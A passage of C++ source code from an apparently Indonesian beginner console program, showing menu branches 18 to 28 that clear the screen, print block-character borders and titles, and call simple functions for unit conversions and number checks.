            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Konversi Hari ke Tahun Minggu dan Hari" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;konversi_hari_ke_tahun_minggu_dan_hari();cout << endl;cout << endl;
        }
		else if(pilihan == 19)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Konversi Menit ke Hitungan Jam dan Menit" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;konversi_menit_ke_hitungan_jam_dan_menit();cout << endl;cout << endl;
        }
		else if(pilihan == 20)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Konversi Suhu" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;konversi_suhu();cout << endl;cout << endl;
        }
		else if(pilihan == 21)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Mencari Bilangan Terbesar dari 2 Bilangan" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;mencari_bilangan_terbesar_dari_2_bilangan();cout << endl;cout << endl;
        }
		else if(pilihan == 22)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Mencari Bilangan Terbesar dari 3 Bilangan" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;mencari_bilangan_terbesar_dari_3_bilangan();cout << endl;cout << endl;
        }
		else if(pilihan == 23)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Menentukan Bilangan Ganjil atau Genap" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;menentukan_bilangan_ganjil_atau_genap();cout << endl;cout << endl;
        }
		else if(pilihan == 24)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Menentukan Bilangan Positif atau Negatif" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;menentukan_bilangan_positif_atau_negatif();cout << endl;cout << endl;
        }
		else if(pilihan == 25)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Menentukan Kategori Tinggi Badan" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;menentukan_kategori_tinggi_badan();cout << endl;cout << endl;
        }
		else if(pilihan == 26)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Menentukan Kesamaan atau Perbedaan 2 Bilangan Bulat" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;menentukan_kesamaan_atau_perbedaan_2_bilangan_bulat();cout << endl;cout << endl;
        }
		else if(pilihan == 27)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Pembagian Dengan Pengurangan Berulang" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;pembagian_dengan_pengurangan_berulang();cout << endl;cout << endl;
        }
		else if(pilihan == 28)
        {
			system("cls");int pilihan;
